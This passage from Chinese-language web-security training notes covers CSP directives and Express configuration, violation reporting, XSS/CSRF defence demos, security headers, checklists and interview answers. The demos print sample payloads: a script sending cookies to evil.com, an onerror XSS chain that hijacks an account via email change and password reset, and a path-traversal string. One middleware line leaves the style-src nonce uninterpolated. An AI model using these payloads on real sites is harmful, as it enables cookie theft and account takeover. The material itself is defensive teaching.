│ report-uri           │ 违规报告 URL (旧版)                           │
│ report-to            │ 违规报告端点 (新版)                           │
├──────────────────────┼──────────────────────────────────────────────┤
│ 源值关键字:            │                                               │
│ 'self'               │ 同源                                         │
│ 'none'               │ 不允许任何源                                 │
│ 'unsafe-inline'      │ 允许内联脚本/样式 (危险!)                     │
│ 'unsafe-eval'        │ 允许 eval() (危险!)                           │
│ 'unsafe-hashes'      │ 允许特定哈希的内联事件处理器                  │
│ nonce-<base64>       │ 一次性随机数                                 │
│ sha256-<base64>      │ 内容哈希                                     │
│ https://cdn.example.com │ 特定域名                                 │
│ *.example.com        │ 通配符子域名                                 │
│ data:                │ data: URI                                    │
│ blob:                │ blob: URI                                    │
│ https:               │ 所有 HTTPS 源                                │
└──────────────────────┴──────────────────────────────────────────────┘
```

### 4.2 CSP 配置示例

```javascript
// ========== CSP 配置 ==========

// === 基础 CSP (推荐起点) ===
const baseCSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self'",
  "img-src 'self' data: https:",
  "font-src 'self'",
  "connect-src 'self'",
  "frame-src 'none'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  "upgrade-insecure-requests",
  "block-all-mixed-content"
].join('; ');

// === 严格 CSP (最高安全) ===
const strictCSP = [
  "default-src 'self'",
  "script-src 'self'",           // 不允许内联/eval
  "style-src 'self'",            // 不允许内联样式
  "img-src 'self' data:",        // 允许 data URI 图片
  "font-src 'self'",
  "connect-src 'self'",
  "media-src 'self'",
  "object-src 'none'",           // 禁止插件
  "frame-src 'none'",            // 禁止 iframe
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",      // 禁止被嵌入
  "upgrade-insecure-requests",
  "block-all-mixed-content",
  "manifest-src 'self'"
].join('; ');

// === 需要内联脚本的 CSP (使用 nonce) ===
function getCSPWithNonce(nonce) {
  return [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}'`,
    `style-src 'self' 'nonce-${nonce}'`,
    "img-src 'self' data: https:",
    "font-src 'self'",
    "connect-src 'self'",
    "object-src 'none'",
    "frame-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'"
  ].join('; ');
}

// Express 中间件: 生成 nonce 并设置 CSP
const crypto = require('crypto');

app.use((req, res, next) => {
  // 生成 nonce
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  // 设置 CSP 头
  res.setHeader('Content-Security-Policy', getCSPWithNonce(nonce));
  
  // 设置 X-Content-Type-Options 防止 MIME 嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // 设置 X-Frame-Options (CSP frame-ancestors 的兼容 fallback)
  res.setHeader('X-Frame-Options', 'DENY');
  
  // 设置 Referrer-Policy
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // 设置 Permissions-Policy
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  
  next();
});

// 前端模板中使用 nonce
// <script nonce="{{nonce}}">
//   // 安全的内联脚本
//   const config = {{jsConfig}};
// </script>
// <link rel="stylesheet" nonce="{{nonce}}" href="/styles.css">
```

### 4.3 CSP 报告与监控

```javascript
// ========== CSP 报告与监控 ==========

// 接收 CSP 违规报告
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'] || req.body;
  
  console.error('CSP Violation:', {
    violatedDirective: report['violated-directive'],
    effectiveDirective: report['effective-directive'],
    blockedURI: report['blocked-uri'],
    lineNumber: report['line-number'],
    columnNumber: report['column-number'],
    sourceFile: report['source-file'],
    statusCode: report['status-code'],
    referrer: report.referrer,
    userAgent: req.headers['user-agent']
  });
  
  // 可以存储到数据库/日志系统/告警系统
  // db.insert('csp_violations', report);
  
  res.status(204).end();
});

// 带报告的 CSP
function getCSPWithReport(reportUri) {
  return [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self'",
    "img-src 'self' data: https:",
    "connect-src 'self'",
    "object-src 'none'",
    "frame-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    `report-uri ${reportUri}`,
    "upgrade-insecure-requests"
  ].join('; ');
}

// 使用 Report-To 头 (新版)
app.use((req, res, next) => {
  // Report-To 端点配置
  res.setHeader('Report-To', JSON.stringify({
    group: 'csp-endpoint',
    max_age: 86400,
    endpoints: [{ url: '/csp-report' }]
  }));
  
  // CSP 使用 report-to
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self'",
    "report-to csp-endpoint"
  ].join('; '));
  
  next();
});
```

### 4.4 CSP 攻防演练

```javascript
// ========== CSP 攻防演练 ==========

class CSPDefenseDemo {
  // 场景 1: 无 CSP — XSS 攻击成功
  scenario1_noCSP() {
    console.log('\n=== 场景 1: 无 CSP ===');
    console.log('攻击: <script>fetch("https://evil.com/steal?c="+document.cookie)</script>');
    console.log('结果: 脚本执行, Cookie 被窃取 ❌');
    console.log('原因: 没有任何 CSP 限制');
  }

  // 场景 2: CSP 阻止内联脚本
  scenario2_cspBlocksInline() {
    console.log('\n=== 场景 2: CSP 阻止内联脚本 ===');
    console.log('CSP: script-src \'self\'');
    console.log('攻击: <script>alert(1)</script>');
    console.log('结果: CSP 拦截! "Refused to execute inline script" ✅');
    console.log('原因: 内联脚本不在 \'self\' 白名单中');
  }

  // 场景 3: CSP 阻止外部脚本
  scenario3_cspBlocksExternal() {
    console.log('\n=== 场景 3: CSP 阻止外部脚本 ===');
    console.log('CSP: script-src \'self\'');
    console.log('攻击: <script src="https://evil.com/xss.js"></script>');
    console.log('结果: CSP 拦截! "Refused to load the script" ✅');
    console.log('原因: 外部域名不在白名单中');
  }

  // 场景 4: Nonce 允许受信任的内联脚本
  scenario4_nonce() {
    console.log('\n=== 场景 4: Nonce 机制 ===');
    console.log('CSP: script-src \'self\' \'nonce-abc123\'');
    console.log('攻击 (无 nonce): <script>alert(1)</script> → 被拦截 ✅');
    console.log('合法 (有 nonce): <script nonce="abc123">init()</script> → 允许执行 ✅');
    console.log('原理: nonce 是一次性随机数, 攻击者无法预测');
  }

  // 场景 5: CSP 阻止 data: URI 脚本
  scenario5_dataUri() {
    console.log('\n=== 场景 5: CSP 阻止 data: URI ===');
    console.log('CSP: script-src \'self\'');
    console.log('攻击: <a href="data:text/html,<script>alert(1)</script>">');
    console.log('结果: CSP 拦截! ✅');
    console.log('原因: data: 不在 script-src 白名单中');
  }

  // 场景 6: frame-ancestors 阻止点击劫持
  scenario6_frameAncestors() {
    console.log('\n=== 场景 6: frame-ancestors 阻止点击劫持 ===');
    console.log('CSP: frame-ancestors \'none\'');
    console.log('攻击: <iframe src="https://bank.com/transfer?amount=10000">');
    console.log('结果: 页面拒绝在 iframe 中加载 ✅');
    console.log('原因: frame-ancestors \'none\' 禁止所有嵌入');
  }

  runAll() {
    this.scenario1_noCSP();
    this.scenario2_cspBlocksInline();
    this.scenario3_cspBlocksExternal();
    this.scenario4_nonce();
    this.scenario5_dataUri();
    this.scenario6_frameAncestors();
  }
}

const cspDemo = new CSPDefenseDemo();
cspDemo.runAll();
```

---

## 5. 综合攻防演练

### 5.1 完整攻击链模拟

```javascript
// ========== 完整攻击链: XSS → CSRF → 数据窃取 ==========

class AttackChainSimulation {
  constructor() {
    this.steps = [];
  }

  // 攻击链: 存储型 XSS + CSRF 组合攻击
  attackChain() {
    console.log('\n╔══════════════════════════════════════════╗');
    console.log('║     完整攻击链: XSS + CSRF 组合攻击       ║');
    console.log('╚══════════════════════════════════════════╝\n');

    // Step 1: 攻击者注入恶意脚本
    console.log('Step 1: 攻击者通过评论注入 XSS');
    console.log('  注入内容:');
    console.log('  <img src=x onerror="');
    console.log('    // 窃取用户 Token');
    console.log('    const token = document.querySelector(\'meta[name=csrf-token]\').content;');
    console.log('    // 用 Token 发起 CSRF 请求');
    console.log('    fetch(\'/api/change-email\', {');
    console.log('      method: \'POST\',');
    console.log('      headers: {\'X-CSRF-Token\': token, \'Content-Type\': \'application/json\'},');
    console.log('      body: JSON.stringify({email: \'attacker@evil.com\'})');
    console.log('    }).then(r => r.json()).then(d => {');
    console.log('      // 重置密码');
    console.log('      fetch(\'/api/reset-password\', {');
    console.log('        method: \'POST\',');
    console.log('        headers: {\'X-CSRF-Token\': token},');
    console.log('        body: JSON.stringify({email: \'attacker@evil.com\'})');
    console.log('      });');
    console.log('    }');
    console.log('  ">');
    console.log('  结果: 恶意脚本存入数据库 ❌\n');

    // Step 2: 受害者访问页面
    console.log('Step 2: 受害者访问含恶意评论的页面');
    console.log('  浏览器加载页面 → 执行恶意脚本');
    console.log('  脚本读取 CSRF Token → 发起请求');
    console.log('  结果: 邮箱被修改, 密码被重置 ❌\n');

    // Step 3: 攻击者接管账户
    console.log('Step 3: 攻击者接管受害者账户');
    console.log('  攻击者收到密码重置邮件 → 设置新密码');
    console.log('  结果: 完全控制受害者账户 ❌\n');

    // 防御
    console.log('══════════════════════════════════════════');
    console.log('  防御体系 (Defense in Depth)');
    console.log('══════════════════════════════════════════\n');
    console.log('Layer 1: 输入净化 — 评论入库前净化 HTML');
    console.log('  → 恶意脚本被移除, Step 1 失败 ✅');
    console.log('');
    console.log('Layer 2: CSP — 禁止内联脚本执行');
    console.log('  → 即使注入成功, 脚本无法执行, Step 2 失败 ✅');
    console.log('');
    console.log('Layer 3: SameSite Cookie — 阻止跨站 Cookie 发送');
    console.log('  → 即使脚本执行, 无法利用 Cookie ✅');
    console.log('');
    console.log('Layer 4: CSRF Token — 验证每个状态变更请求');
    console.log('  → 即使 Token 被窃取, 需要额外验证 ✅');
    console.log('');
    console.log('Layer 5: 敏感操作二次验证 — 修改邮箱/密码需要确认');
    console.log('  → 即使所有防线被突破, 业务层仍然安全 ✅');
  }

  // 防御代码: 综合安全中间件
  static createSecurityMiddleware() {
    const crypto = require('crypto');

    return function securityMiddleware(req, res, next) {
      // 1. 生成 nonce
      const nonce = crypto.randomBytes(16).toString('base64');
      res.locals.nonce = nonce;

      // 2. CSP
      res.setHeader('Content-Security-Policy', [
        "default-src 'self'",
        `script-src 'self' 'nonce-${nonce}'`,
        "style-src 'self' 'nonce-${nonce}'",
        "img-src 'self' data: https:",
        "font-src 'self'",
        "connect-src 'self'",
        "object-src 'none'",
        "frame-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'none'",
        "upgrade-insecure-requests",
        "block-all-mixed-content"
      ].join('; '));

      // 3. 安全头
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('X-Frame-Options', 'DENY');
      res.setHeader('X-XSS-Protection', '0'); // 现代浏览器不需要, 反而可能引入问题
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
      res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');

      // 4. Cookie 安全
      if (req.session) {
        res.cookie('session', req.session.id, {
          httpOnly: true,
          secure: true,
          sameSite: 'strict',
          maxAge: 3600000
        });
      }

      // 5. CSRF Token
      if (!req.session.csrfToken) {
        req.session.csrfToken = crypto.randomBytes(32).toString('hex');
      }
      res.locals.csrfToken = req.session.csrfToken;

      next();
    };
  }
}

// 运行演练
const chain = new AttackChainSimulation();
chain.attackChain();
```

### 5.2 安全 HTTP 头速查

```javascript
// ========== 安全 HTTP 头速查 ==========

const securityHeaders = {
  // 内容安全策略
  'Content-Security-Policy': "default-src 'self'; script-src 'self'; frame-ancestors 'none'",
  
  // 防止 MIME 嗅探
  'X-Content-Type-Options': 'nosniff',
  
  // 防止点击劫持 (CSP frame-ancestors 的兼容)
  'X-Frame-Options': 'DENY',
  
  // XSS 过滤器 (现代浏览器已弃用, 但旧浏览器仍有用)
  'X-XSS-Protection': '0', // 推荐设为 0, 让 CSP 接管
  
  // Referrer 策略
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  
  // 权限策略
  'Permissions-Policy': 'camera=(), microphone=(), geolocation=(), payment=()',
  
  // HSTS (HTTPS Strict Transport Security)
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
  
  // 跨域策略
  'Cross-Origin-Opener-Policy': 'same-origin',
  'Cross-Origin-Embedder-Policy': 'require-corp',
  'Cross-Origin-Resource-Policy': 'same-origin',
  
  // 缓存控制 (敏感页面)
  'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
  'Pragma': 'no-cache',
  'Expires': '0'
};

// Helmet 中间件 (自动设置安全头)
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: []
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

---

## 6. 安全代码 Checklist

### 6.1 前端安全 Checklist

```
✅ [ ] 用户输入不直接写入 innerHTML / outerHTML
✅ [ ] 需要 HTML 时使用 DOMPurify 净化
✅ [ ] URL 参数不直接写入 DOM
✅ [ ] 不使用 eval() / new Function() / setTimeout(string)
✅ [ ] 动态 URL 属性 (href/src) 使用白名单验证
✅ [ ] 表单提交携带 CSRF Token
✅ [ ] Fetch 请求使用 credentials: 'same-origin'
✅ [ ] 不暴露敏感信息到 console / 错误消息
✅ [ ] 第三方脚本使用 integrity 属性 (SRI)
✅ [ ] 敏感操作 (转账/改密码) 有二次确认
```

### 6.2 后端安全 Checklist

```
✅ [ ] CSP 头正确设置
✅ [ ] SameSite Cookie 配置
✅ [ ] CSRF Token 验证所有状态变更请求
✅ [ ] 输入验证 (类型/长度/格式/范围)
✅ [ ] 输出转义 (HTML/JS/CSS/URL 上下文)
✅ [ ] SQL 参数化查询 (不拼接)
✅ [ ] 文件上传: 随机文件名 + MIME 白名单 + 大小限制
✅ [ ] 错误消息不泄露敏感信息 (堆栈/路径/查询)
✅ [ ] Rate limiting 防止暴力破解
✅ [ ] HTTPS 强制 (HSTS)
✅ [ ] Session 安全配置 (httpOnly/secure/sameSite)
✅ [ ] 敏感操作日志记录
```

### 6.3 安全头 Checklist

```
✅ [ ] Content-Security-Policy (CSP)
✅ [ ] X-Content-Type-Options: nosniff
✅ [ ] X-Frame-Options: DENY
✅ [ ] Referrer-Policy: strict-origin-when-cross-origin
✅ [ ] Permissions-Policy (限制浏览器 API)
✅ [ ] Strict-Transport-Security (HSTS)
✅ [ ] Cross-Origin-Opener-Policy
✅ [ ] Cross-Origin-Embedder-Policy
✅ [ ] Cross-Origin-Resource-Policy
```

---

## 7. 面试高频题

### Q1: XSS 有哪些类型? 如何防御?

```
答:
- 反射型: URL 参数注入, 防御: 输出转义
- 存储型: 数据库存储后渲染, 防御: 输入净化 + 输出转义
- DOM 型: 前端直接操作 DOM, 防御: textContent > innerHTML, DOMPurify

核心原则: 不信任任何用户输入, 输入验证 + 输出转义 + CSP 兜底
```

### Q2: CSRF 攻击原理? 有哪些防御方式?

```
答:
原理: 利用浏览器自动携带 Cookie 的机制, 诱导用户在已登录状态下发起非预期请求。

防御方式 (按优先级):
1. SameSite Cookie (最简单有效)
2. CSRF Token (双重保险)
3. Origin/Referer 验证
4. 敏感操作二次验证
5. 使用 JSON API + 自定义 Header (非简单请求)
```

### Q3: CSP 是什么? 如何配置?

```
答:
CSP (Content Security Policy) 是浏览器安全机制, 通过 HTTP 头或 meta 标签
控制资源加载来源, 阻止 XSS 攻击。

配置示例:
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'

关键指令:
- default-src: 默认源
- script-src: JS 源 (禁止 'unsafe-inline' 和 'unsafe-eval')
- frame-ancestors: 禁止被嵌入 (防点击劫持)
- form-action: 限制表单提交目标

高级用法:
- nonce: 允许受信任的内联脚本
- report-uri: 违规报告
```

### Q4: 如何安全地处理用户输入的 HTML?

```
答:
1. 首选: 用 Markdown 替代 HTML (用户输入 Markdown, 服务端渲染)
2. 必须 HTML: 使用 DOMPurify 净化
   - 白名单标签 + 白名单属性
   - 禁止事件处理器
   - 禁止 javascript:/data: 协议
3. 双重保险: 净化 + 输出时转义
4. CSP 兜底: script-src 'self' 阻止执行
```

### Q5: 文件上传有哪些安全风险? 如何防御?

```
答:
风险:
- 上传恶意文件 (Web Shell/病毒)
- 路径遍历 (../../../etc/passwd)
- MIME 类型欺骗
- 超大文件 (DoS)
- 文件名冲突/覆盖

防御:
1. 随机文件名 (不信任用户输入)
2. MIME 白名单 + 扩展名白名单 (双重验证)
3. 文件大小限制
4. 路径规范化 + 限制上传目录
5. 图片检查文件头 (Magic Number)
6. 独立文件服务域名 (隔离 Cookie)
```

---

## 总结

### 安全核心原则

```
1. 不信任任何用户输入 (Zero Trust)
2. 输入验证 + 输出转义 (Validate Input, Escape Output)
3. 纵深防御 (Defense in Depth) — 多层防护
4. 最小权限 (Principle of Least Privilege)
5. 安全默认 (Secure by Default)
6. 持续监控 + 报告 (Monitor & Report)
```

### 安全武器库

```
前端:
- textContent > innerHTML
- DOMPurify (HTML 净化)
- CSP (浏览器级防护)
- SameSite Cookie
- CSRF Token

后端:
- 输入验证 (类型/长度/格式/范围)
- 输出转义 (HTML/JS/CSS/URL 上下文)
- 参数化查询 (SQL)
- Helmet (安全头)
- Rate Limiting
- 文件上传安全

HTTP 头:
- Content-Security-Policy
- X-Content-Type-Options: nosniff
- X-Frame-Options: DENY
- Strict-Transport-Security
- Referrer-Policy
- Permissions-Policy
```

---

*专项训练 13:00 Web 安全 — 完成 ✅*
*覆盖: XSS (3 类型 + 攻防演练) / CSRF (原理 + 5 种防御) / 输入净化 (验证 vs 净化 + 文件上传) / CSP (指令大全 + nonce + 报告) / 综合攻防演练 / Checklist / 面试高频题*
